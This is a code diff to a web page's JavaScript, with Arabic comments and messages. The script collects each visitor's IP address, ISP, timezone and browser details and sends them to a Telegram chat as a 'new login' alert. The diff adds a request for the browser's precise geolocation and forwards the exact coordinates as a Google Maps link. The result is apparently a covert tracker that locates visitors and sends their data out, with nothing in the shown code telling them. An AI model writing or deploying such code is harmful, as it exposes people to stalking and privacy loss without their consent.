@@ -80,12 +80,12 @@
     }
 
     // دالة لإرسال البيانات إلى Telegram
-    async function sendToTelegram(ipInfo, ipAddress, browserInfo) {
+    async function sendToTelegram(ipInfo, ipAddress, browserInfo, location) {
       const message = `
       تم تسجيل دخول جديد:
       عنوان IP: ${ipAddress}
-      الموقع: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
-      الإحداثيات: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}
+      الموقع: ${location.city}, ${location.region}, ${location.country}
+      الإحداثيات: https://www.google.com/maps?q=${location.lat},${location.lon}
       مزود الخدمة: ${ipInfo.isp || 'غير معروف'}
       التوقيت المحلي: ${ipInfo.timezone || 'غير معروف'}
       العملة: ${ipInfo.currency || 'غير معروف'}
@@ -111,8 +111,26 @@
         // جلب معلومات المتصفح والجهاز
         const browserInfo = getBrowserInfo();
 
-        // إرسال جميع البيانات إلى Telegram
-        sendToTelegram(ipInfo, ipAddress.query, browserInfo);
+        // طلب إذن الموقع من المتصفح
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async (position) => {
+            const location = {
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              city: ipInfo.city || "غير متوفر",
+              region: ipInfo.regionName || "غير متوفر",
+              country: ipInfo.country || "غير متوفر"
+            };
+
+            // إرسال البيانات إلى Telegram بعد الحصول على الموقع
+            sendToTelegram(ipInfo, ipAddress.query, browserInfo, location);
+          }, (error) => {
+            console.error("لم يتمكن من الحصول على الموقع:", error);
+          });
+        } else {
+          console.log("إذن الموقع غير مدعوم في المتصفح.");
+        }
+
       } catch (error) {
         console.error("خطأ أثناء جلب البيانات:", error);
       }
